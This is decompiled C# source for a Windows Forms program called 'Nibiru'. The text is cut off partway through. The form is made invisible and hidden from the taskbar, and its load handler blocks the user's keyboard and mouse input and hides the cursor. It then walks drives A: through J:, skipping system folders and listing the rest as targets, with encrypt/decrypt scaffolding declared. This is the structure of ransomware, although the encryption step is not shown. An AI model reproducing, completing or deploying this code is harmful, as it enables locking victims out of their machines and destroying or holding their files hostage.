using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Nibiru.My;

namespace Nibiru;

[DesignerGenerated]
public class Form1 : Form
{
	public enum CryptoAction
	{
		ActionEncrypt = 1,
		ActionDecrypt
	}

	private IContainer components;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("ListBox2")]
	private ListBox _ListBox2;

	[AccessedThroughProperty("ListBox3")]
	private ListBox _ListBox3;

	[AccessedThroughProperty("ListBox4")]
	private ListBox _ListBox4;

	[AccessedThroughProperty("ListBox5")]
	private ListBox _ListBox5;

	[AccessedThroughProperty("ListBox6")]
	private ListBox _ListBox6;

	[AccessedThroughProperty("ListBox7")]
	private ListBox _ListBox7;

	[AccessedThroughProperty("ListBox8")]
	private ListBox _ListBox8;

	[AccessedThroughProperty("ListBox9")]
	private ListBox _ListBox9;

	[AccessedThroughProperty("ListBox10")]
	private ListBox _ListBox10;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("ProgressBar2")]
	private ProgressBar _ProgressBar2;

	[AccessedThroughProperty("ProgressBar3")]
	private ProgressBar _ProgressBar3;

	[AccessedThroughProperty("ProgressBar4")]
	private ProgressBar _ProgressBar4;

	[AccessedThroughProperty("ProgressBar5")]
	private ProgressBar _ProgressBar5;

	[AccessedThroughProperty("ProgressBar6")]
	private ProgressBar _ProgressBar6;

	[AccessedThroughProperty("ProgressBar7")]
	private ProgressBar _ProgressBar7;

	[AccessedThroughProperty("ProgressBar8")]
	private ProgressBar _ProgressBar8;

	[AccessedThroughProperty("ProgressBar9")]
	private ProgressBar _ProgressBar9;

	[AccessedThroughProperty("ProgressBar10")]
	private ProgressBar _ProgressBar10;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("Timer4")]
	private Timer _Timer4;

	[AccessedThroughProperty("Timer5")]
	private Timer _Timer5;

	[AccessedThroughProperty("Timer6")]
	private Timer _Timer6;

	[AccessedThroughProperty("Timer7")]
	private Timer _Timer7;

	[AccessedThroughProperty("Timer8")]
	private Timer _Timer8;

	[AccessedThroughProperty("Timer9")]
	private Timer _Timer9;

	[AccessedThroughProperty("Timer10")]
	private Timer _Timer10;

	private string filenamez;

	private string strFileToEncrypt;

	private string strFileToDecrypt;

	private string strOutputEncrypt;

	private string strOutputDecrypt;

	private FileStream fsInput;

	private FileStream fsOutput;

	internal virtual ListBox ListBox1
	{
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual ListBox ListBox2
	{
		get
		{
			return _ListBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox2 = value;
		}
	}

	internal virtual ListBox ListBox3
	{
		get
		{
			return _ListBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox3 = value;
		}
	}

	internal virtual ListBox ListBox4
	{
		get
		{
			return _ListBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox4 = value;
		}
	}

	internal virtual ListBox ListBox5
	{
		get
		{
			return _ListBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox5 = value;
		}
	}

	internal virtual ListBox ListBox6
	{
		get
		{
			return _ListBox6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox6 = value;
		}
	}

	internal virtual ListBox ListBox7
	{
		get
		{
			return _ListBox7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox7 = value;
		}
	}

	internal virtual ListBox ListBox8
	{
		get
		{
			return _ListBox8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox8 = value;
		}
	}

	internal virtual ListBox ListBox9
	{
		get
		{
			return _ListBox9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox9 = value;
		}
	}

	internal virtual ListBox ListBox10
	{
		get
		{
			return _ListBox10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox10 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar2
	{
		get
		{
			return _ProgressBar2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar2 = value;
		}
	}

	internal virtual ProgressBar ProgressBar3
	{
		get
		{
			return _ProgressBar3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar3 = value;
		}
	}

	internal virtual ProgressBar ProgressBar4
	{
		get
		{
			return _ProgressBar4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar4 = value;
		}
	}

	internal virtual ProgressBar ProgressBar5
	{
		get
		{
			return _ProgressBar5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar5 = value;
		}
	}

	internal virtual ProgressBar ProgressBar6
	{
		get
		{
			return _ProgressBar6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar6 = value;
		}
	}

	internal virtual ProgressBar ProgressBar7
	{
		get
		{
			return _ProgressBar7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar7 = value;
		}
	}

	internal virtual ProgressBar ProgressBar8
	{
		get
		{
			return _ProgressBar8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar8 = value;
		}
	}

	internal virtual ProgressBar ProgressBar9
	{
		get
		{
			return _ProgressBar9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar9 = value;
		}
	}

	internal virtual ProgressBar ProgressBar10
	{
		get
		{
			return _ProgressBar10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar10 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer4
	{
		get
		{
			return _Timer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer4_Tick;
			if (_Timer4 != null)
			{
				_Timer4.remove_Tick(eventHandler);
			}
			_Timer4 = value;
			if (_Timer4 != null)
			{
				_Timer4.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer5
	{
		get
		{
			return _Timer5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer5_Tick;
			if (_Timer5 != null)
			{
				_Timer5.remove_Tick(eventHandler);
			}
			_Timer5 = value;
			if (_Timer5 != null)
			{
				_Timer5.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer6
	{
		get
		{
			return _Timer6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer6_Tick;
			if (_Timer6 != null)
			{
				_Timer6.remove_Tick(eventHandler);
			}
			_Timer6 = value;
			if (_Timer6 != null)
			{
				_Timer6.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer7
	{
		get
		{
			return _Timer7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer7_Tick;
			if (_Timer7 != null)
			{
				_Timer7.remove_Tick(eventHandler);
			}
			_Timer7 = value;
			if (_Timer7 != null)
			{
				_Timer7.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer8
	{
		get
		{
			return _Timer8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer8_Tick;
			if (_Timer8 != null)
			{
				_Timer8.remove_Tick(eventHandler);
			}
			_Timer8 = value;
			if (_Timer8 != null)
			{
				_Timer8.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer9
	{
		get
		{
			return _Timer9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Timer9 = value;
		}
	}

	internal virtual Timer Timer10
	{
		get
		{
			return _Timer10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Timer10 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Expected O, but got Unknown
		//IL_0121: Unknown result type (might be due to invalid IL or missing references)
		//IL_012b: Expected O, but got Unknown
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Expected O, but got Unknown
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_014d: Expected O, but got Unknown
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		//IL_015e: Expected O, but got Unknown
		//IL_0165: Unknown result type (might be due to invalid IL or missing references)
		//IL_016f: Expected O, but got Unknown
		//IL_0176: Unknown result type (might be due to invalid IL or missing references)
		//IL_0180: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		components = new Container();
		ListBox1 = new ListBox();
		ListBox2 = new ListBox();
		ListBox3 = new ListBox();
		ListBox4 = new ListBox();
		ListBox5 = new ListBox();
		ListBox6 = new ListBox();
		ListBox7 = new ListBox();
		ListBox8 = new ListBox();
		ListBox9 = new ListBox();
		ListBox10 = new ListBox();
		ProgressBar1 = new ProgressBar();
		ProgressBar2 = new ProgressBar();
		ProgressBar3 = new ProgressBar();
		ProgressBar4 = new ProgressBar();
		ProgressBar5 = new ProgressBar();
		ProgressBar6 = new ProgressBar();
		ProgressBar7 = new ProgressBar();
		ProgressBar8 = new ProgressBar();
		ProgressBar9 = new ProgressBar();
		ProgressBar10 = new ProgressBar();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		Timer3 = new Timer(components);
		Timer4 = new Timer(components);
		Timer5 = new Timer(components);
		Timer6 = new Timer(components);
		Timer7 = new Timer(components);
		Timer8 = new Timer(components);
		Timer9 = new Timer(components);
		Timer10 = new Timer(components);
		((Control)this).SuspendLayout();
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		Point location = new Point(0, 0);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		Size size = new Size(120, 95);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(0);
		((ListControl)ListBox2).set_FormattingEnabled(true);
		ListBox listBox3 = ListBox2;
		location = new Point(256, 0);
		((Control)listBox3).set_Location(location);
		((Control)ListBox2).set_Name("ListBox2");
		ListBox listBox4 = ListBox2;
		size = new Size(120, 95);
		((Control)listBox4).set_Size(size);
		((Control)ListBox2).set_TabIndex(1);
		((ListControl)ListBox3).set_FormattingEnabled(true);
		ListBox listBox5 = ListBox3;
		location = new Point(504, 0);
		((Control)listBox5).set_Location(location);
		((Control)ListBox3).set_Name("ListBox3");
		ListBox listBox6 = ListBox3;
		size = new Size(120, 95);
		((Control)listBox6).set_Size(size);
		((Control)ListBox3).set_TabIndex(2);
		((ListControl)ListBox4).set_FormattingEnabled(true);
		ListBox listBox7 = ListBox4;
		location = new Point(749, 0);
		((Control)listBox7).set_Location(location);
		((Control)ListBox4).set_Name("ListBox4");
		ListBox listBox8 = ListBox4;
		size = new Size(120, 95);
		((Control)listBox8).set_Size(size);
		((Control)ListBox4).set_TabIndex(3);
		((ListControl)ListBox5).set_FormattingEnabled(true);
		ListBox listBox9 = ListBox5;
		location = new Point(0, 185);
		((Control)listBox9).set_Location(location);
		((Control)ListBox5).set_Name("ListBox5");
		ListBox listBox10 = ListBox5;
		size = new Size(120, 95);
		((Control)listBox10).set_Size(size);
		((Control)ListBox5).set_TabIndex(4);
		((ListControl)ListBox6).set_FormattingEnabled(true);
		ListBox listBox11 = ListBox6;
		location = new Point(256, 185);
		((Control)listBox11).set_Location(location);
		((Control)ListBox6).set_Name("ListBox6");
		ListBox listBox12 = ListBox6;
		size = new Size(120, 95);
		((Control)listBox12).set_Size(size);
		((Control)ListBox6).set_TabIndex(5);
		((ListControl)ListBox7).set_FormattingEnabled(true);
		ListBox listBox13 = ListBox7;
		location = new Point(504, 185);
		((Control)listBox13).set_Location(location);
		((Control)ListBox7).set_Name("ListBox7");
		ListBox listBox14 = ListBox7;
		size = new Size(120, 95);
		((Control)listBox14).set_Size(size);
		((Control)ListBox7).set_TabIndex(6);
		((ListControl)ListBox8).set_FormattingEnabled(true);
		ListBox listBox15 = ListBox8;
		location = new Point(749, 185);
		((Control)listBox15).set_Location(location);
		((Control)ListBox8).set_Name("ListBox8");
		ListBox listBox16 = ListBox8;
		size = new Size(120, 95);
		((Control)listBox16).set_Size(size);
		((Control)ListBox8).set_TabIndex(7);
		((ListControl)ListBox9).set_FormattingEnabled(true);
		ListBox listBox17 = ListBox9;
		location = new Point(0, 375);
		((Control)listBox17).set_Location(location);
		((Control)ListBox9).set_Name("ListBox9");
		ListBox listBox18 = ListBox9;
		size = new Size(120, 95);
		((Control)listBox18).set_Size(size);
		((Control)ListBox9).set_TabIndex(8);
		((ListControl)ListBox10).set_FormattingEnabled(true);
		ListBox listBox19 = ListBox10;
		location = new Point(256, 375);
		((Control)listBox19).set_Location(location);
		((Control)ListBox10).set_Name("ListBox10");
		ListBox listBox20 = ListBox10;
		size = new Size(120, 95);
		((Control)listBox20).set_Size(size);
		((Control)ListBox10).set_TabIndex(9);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(0, 101);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(120, 23);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(10);
		ProgressBar progressBar3 = ProgressBar2;
		location = new Point(256, 101);
		((Control)progressBar3).set_Location(location);
		((Control)ProgressBar2).set_Name("ProgressBar2");
		ProgressBar progressBar4 = ProgressBar2;
		size = new Size(120, 23);
		((Control)progressBar4).set_Size(size);
		((Control)ProgressBar2).set_TabIndex(11);
		ProgressBar progressBar5 = ProgressBar3;
		location = new Point(504, 101);
		((Control)progressBar5).set_Location(location);
		((Control)ProgressBar3).set_Name("ProgressBar3");
		ProgressBar progressBar6 = ProgressBar3;
		size = new Size(120, 23);
		((Control)progressBar6).set_Size(size);
		((Control)ProgressBar3).set_TabIndex(12);
		ProgressBar progressBar7 = ProgressBar4;
		location = new Point(749, 101);
		((Control)progressBar7).set_Location(location);
		((Control)ProgressBar4).set_Name("ProgressBar4");
		ProgressBar progressBar8 = ProgressBar4;
		size = new Size(120, 23);
		((Control)progressBar8).set_Size(size);
		((Control)ProgressBar4).set_TabIndex(13);
		ProgressBar progressBar9 = ProgressBar5;
		location = new Point(0, 286);
		((Control)progressBar9).set_Location(location);
		((Control)ProgressBar5).set_Name("ProgressBar5");
		ProgressBar progressBar10 = ProgressBar5;
		size = new Size(116, 23);
		((Control)progressBar10).set_Size(size);
		((Control)ProgressBar5).set_TabIndex(14);
		ProgressBar progressBar11 = ProgressBar6;
		location = new Point(256, 286);
		((Control)progressBar11).set_Location(location);
		((Control)ProgressBar6).set_Name("ProgressBar6");
		ProgressBar progressBar12 = ProgressBar6;
		size = new Size(120, 23);
		((Control)progressBar12).set_Size(size);
		((Control)ProgressBar6).set_TabIndex(15);
		ProgressBar progressBar13 = ProgressBar7;
		location = new Point(504, 286);
		((Control)progressBar13).set_Location(location);
		((Control)ProgressBar7).set_Name("ProgressBar7");
		ProgressBar progressBar14 = ProgressBar7;
		size = new Size(120, 23);
		((Control)progressBar14).set_Size(size);
		((Control)ProgressBar7).set_TabIndex(16);
		ProgressBar progressBar15 = ProgressBar8;
		location = new Point(749, 286);
		((Control)progressBar15).set_Location(location);
		((Control)ProgressBar8).set_Name("ProgressBar8");
		ProgressBar progressBar16 = ProgressBar8;
		size = new Size(120, 23);
		((Control)progressBar16).set_Size(size);
		((Control)ProgressBar8).set_TabIndex(17);
		ProgressBar progressBar17 = ProgressBar9;
		location = new Point(0, 476);
		((Control)progressBar17).set_Location(location);
		((Control)ProgressBar9).set_Name("ProgressBar9");
		ProgressBar progressBar18 = ProgressBar9;
		size = new Size(116, 23);
		((Control)progressBar18).set_Size(size);
		((Control)ProgressBar9).set_TabIndex(18);
		ProgressBar progressBar19 = ProgressBar10;
		location = new Point(256, 476);
		((Control)progressBar19).set_Location(location);
		((Control)ProgressBar10).set_Name("ProgressBar10");
		ProgressBar progressBar20 = ProgressBar10;
		size = new Size(320, 23);
		((Control)progressBar20).set_Size(size);
		((Control)ProgressBar10).set_TabIndex(19);
		Timer1.set_Interval(10);
		Timer2.set_Interval(10);
		Timer3.set_Interval(10);
		Timer4.set_Interval(10);
		Timer5.set_Interval(10);
		Timer6.set_Interval(10);
		Timer7.set_Interval(10);
		Timer8.set_Interval(10);
		Timer9.set_Interval(10);
		Timer10.set_Interval(10);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(994, 498);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar10);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar9);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar8);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar7);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar6);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar5);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar4);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar3);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar2);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)ListBox10);
		((Control)this).get_Controls().Add((Control)(object)ListBox9);
		((Control)this).get_Controls().Add((Control)(object)ListBox8);
		((Control)this).get_Controls().Add((Control)(object)ListBox7);
		((Control)this).get_Controls().Add((Control)(object)ListBox6);
		((Control)this).get_Controls().Add((Control)(object)ListBox5);
		((Control)this).get_Controls().Add((Control)(object)ListBox4);
		((Control)this).get_Controls().Add((Control)(object)ListBox3);
		((Control)this).get_Controls().Add((Control)(object)ListBox2);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int BlockInput(int fBlock);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int ShowCursor(int lShow);

	private void Form1_Load(object sender, EventArgs e)
	{
		BlockInput(1);
		ShowCursor(0);
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("A:\\"))
			{
				if (!directory.EndsWith("Bin") && !directory.EndsWith("indows") && !directory.EndsWith("tings") && !directory.EndsWith("System Volume Information") && !directory.EndsWith("cache") && !directory.EndsWith("very") && !directory.EndsWith("rogram Files (x86)") && !directory.EndsWith("rogram Files") && !directory.EndsWith("boot") && !directory.EndsWith("efi") && !directory.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory);
					ListBox9.get_Items().Add((object)directory);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("B:\\"))
			{
				if (!directory2.EndsWith("Bin") && !directory2.EndsWith("indows") && !directory2.EndsWith("tings") && !directory2.EndsWith("System Volume Information") && !directory2.EndsWith("cache") && !directory2.EndsWith("very") && !directory2.EndsWith("rogram Files (x86)") && !directory2.EndsWith("rogram Files") && !directory2.EndsWith("boot") && !directory2.EndsWith("efi") && !directory2.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory2);
					ListBox9.get_Items().Add((object)directory2);
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\"))
			{
				if (!directory3.EndsWith("Bin") && !directory3.EndsWith("indows") && !directory3.EndsWith("tings") && !directory3.EndsWith("System Volume Information") && !directory3.EndsWith("cache") && !directory3.EndsWith("very") && !directory3.EndsWith("rogram Files (x86)") && !directory3.EndsWith("rogram Files") && !directory3.EndsWith("boot") && !directory3.EndsWith("efi") && !directory3.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory3);
					ListBox9.get_Items().Add((object)directory3);
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("D:\\"))
			{
				if (!directory4.EndsWith("Bin") && !directory4.EndsWith("indows") && !directory4.EndsWith("tings") && !directory4.EndsWith("System Volume Information") && !directory4.EndsWith("cache") && !directory4.EndsWith("very") && !directory4.EndsWith("rogram Files (x86)") && !directory4.EndsWith("rogram Files") && !directory4.EndsWith("boot") && !directory4.EndsWith("efi") && !directory4.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory4);
					ListBox9.get_Items().Add((object)directory4);
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("E:\\"))
			{
				if (!directory5.EndsWith("Bin") && !directory5.EndsWith("indows") && !directory5.EndsWith("tings") && !directory5.EndsWith("System Volume Information") && !directory5.EndsWith("cache") && !directory5.EndsWith("very") && !directory5.EndsWith("rogram Files (x86)") && !directory5.EndsWith("rogram Files") && !directory5.EndsWith("boot") && !directory5.EndsWith("efi") && !directory5.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory5);
					ListBox9.get_Items().Add((object)directory5);
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("F:\\"))
			{
				if (!directory6.EndsWith("Bin") && !directory6.EndsWith("indows") && !directory6.EndsWith("tings") && !directory6.EndsWith("System Volume Information") && !directory6.EndsWith("cache") && !directory6.EndsWith("very") && !directory6.EndsWith("rogram Files (x86)") && !directory6.EndsWith("rogram Files") && !directory6.EndsWith("boot") && !directory6.EndsWith("efi") && !directory6.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory6);
					ListBox9.get_Items().Add((object)directory6);
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("G:\\"))
			{
				if (!directory7.EndsWith("Bin") && !directory7.EndsWith("indows") && !directory7.EndsWith("tings") && !directory7.EndsWith("System Volume Information") && !directory7.EndsWith("cache") && !directory7.EndsWith("very") && !directory7.EndsWith("rogram Files (x86)") && !directory7.EndsWith("rogram Files") && !directory7.EndsWith("boot") && !directory7.EndsWith("efi") && !directory7.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory7);
					ListBox9.get_Items().Add((object)directory7);
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory8 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("H:\\"))
			{
				if (!directory8.EndsWith("Bin") && !directory8.EndsWith("indows") && !directory8.EndsWith("tings") && !directory8.EndsWith("System Volume Information") && !directory8.EndsWith("cache") && !directory8.EndsWith("very") && !directory8.EndsWith("rogram Files (x86)") && !directory8.EndsWith("rogram Files") && !directory8.EndsWith("boot") && !directory8.EndsWith("efi") && !directory8.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory8);
					ListBox9.get_Items().Add((object)directory8);
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory9 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("I:\\"))
			{
				if (!directory9.EndsWith("Bin") && !directory9.EndsWith("indows") && !directory9.EndsWith("tings") && !directory9.EndsWith("System Volume Information") && !directory9.EndsWith("cache") && !directory9.EndsWith("very") && !directory9.EndsWith("rogram Files (x86)") && !directory9.EndsWith("rogram Files") && !directory9.EndsWith("boot") && !directory9.EndsWith("efi") && !directory9.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory9);
					ListBox9.get_Items().Add((object)directory9);
				}
			}
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory10 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("J:\\"))
			{
